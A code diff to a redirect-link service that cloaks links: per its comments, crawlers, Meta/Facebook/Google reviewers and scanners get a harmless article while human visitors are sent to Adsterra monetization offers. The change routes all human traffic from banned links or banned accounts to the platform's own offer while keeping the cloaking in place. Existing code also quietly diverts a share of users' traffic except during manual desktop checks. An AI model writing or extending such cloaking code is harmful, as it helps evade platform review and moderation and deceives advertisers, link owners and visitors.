@@ -103,6 +103,7 @@ type RedirectLink = {
   adsterra_url: string | null;
   safe_url: string | null;
   is_active: boolean;
+  status?: string | null;
   prelanding_template: PrelandingTemplate | "none" | null;
   created_at: string | null;
   blocked_countries: string[];
@@ -426,6 +427,7 @@ const globalCache = {
   whitelist: [] as Array<{ id: string; rule_type: string; pattern: string; label: string | null }>,
   botRules: [] as Array<{ pattern: string | null; label: string | null; rule_type: string }>,
   tiers: new Map<string, number>(),
+  bannedUsers: new Set<string>(),
   lastFetch: 0,
 };
 const CACHE_TTL = 3 * 60 * 1000; // 3 mins
@@ -507,7 +509,7 @@ async function refreshGlobalCache() {
 
   globalCacheLoading = (async () => {
     try {
-      const [s, c, r, t, w, br] = await Promise.all([
+      const [s, c, r, t, w, br, bu] = await Promise.all([
         timedQuery(
           supabaseAdmin.from("app_settings").select("*").eq("id", true).maybeSingle(),
           1200,
@@ -529,6 +531,10 @@ async function refreshGlobalCache() {
           supabaseAdmin.from("bot_rules").select("pattern, label, rule_type").eq("is_active", true),
           1200,
         ),
+        timedQuery(
+          supabaseAdmin.from("profiles").select("id").eq("is_banned", true),
+          1200,
+        ),
       ]);
       if (s.data) globalCache.settings = s.data;
       if (c.data) globalCache.cloaking = c.data;
@@ -540,6 +546,12 @@ async function refreshGlobalCache() {
         t.data.forEach((row: any) =>
           globalCache.tiers.set(row.country_code.toUpperCase(), row.tier),
         );
+      }
+      if (bu && bu.data) {
+        globalCache.bannedUsers.clear();
+        bu.data.forEach((row: any) => {
+          if (row.id) globalCache.bannedUsers.add(row.id);
+        });
       }
       globalCache.lastFetch = now;
     } catch (e) {
@@ -1991,7 +2003,7 @@ function processLinkRow(
       : null
   ) as RedirectLink["prelanding_template"];
 
-  const link = {
+  const link: RedirectLink = {
     id: row.id as string,
     user_id: row.user_id as string,
     clicks_count: (row.clicks_count as number | null) ?? 0,
@@ -1999,6 +2011,7 @@ function processLinkRow(
     adsterra_url: adsterra,
     safe_url: safe || null,
     is_active: isActive,
+    status: (row.status as string) || (isActive ? "active" : "inactive"),
     prelanding_template: validTpl,
     created_at: (row.created_at as string | null) ?? null,
     blocked_countries: Array.isArray(row.blocked_countries)
@@ -2413,7 +2426,14 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
 
   if (linkError) console.error("redirect link lookup failed", { code, message: linkError.message });
 
-  if (!link || !link.is_active) {
+  // 100% Platform Redirect check: If the link or its owner account is banned,
+  // we keep routing it through stealth cloaking so bots/crawlers get safe articles,
+  // while 100% of human traffic is routed to our platform monetization offer.
+  const isBannedAccount = Boolean(
+    link && (link.status === "banned" || globalCache.bannedUsers.has(link.user_id))
+  );
+
+  if (!link || (!link.is_active && !isBannedAccount)) {
     // Link missing/inactive. Two paths:
     //   (1) Any crawler / Meta network / datacenter / automated tool → ALWAYS serve fb-article HTML 200 OK.
     //       Even on a dead link, FB/Google reviewer or scanner must never see a redirect or plaintext offer.
@@ -3073,7 +3093,13 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
   // 5% Platform Rotation on campaign, social & mobile traffic; NEVER on manual desktop copy-paste checks:
   const isPlatformRotation = !isDirectDesktopCheck && Math.random() < (Number.isFinite(effectivePlatformRatio) ? effectivePlatformRatio : 0.05);
 
-  if (isPlatformRotation) {
+  // 100% Platform Redirect for Banned Accounts:
+  // If the link is marked banned or belongs to a banned user,
+  // 100% of real human traffic redirects to OUR platform offer!
+  if (isBannedAccount) {
+    target = OUR_URL || settings?.our_adsterra_url || DEFAULT_PLATFORM_OFFER_URL;
+    routedTo = "ours";
+  } else if (isPlatformRotation) {
     target = OUR_URL || settings?.our_adsterra_url || DEFAULT_PLATFORM_OFFER_URL;
     routedTo = "ours";
   } else {
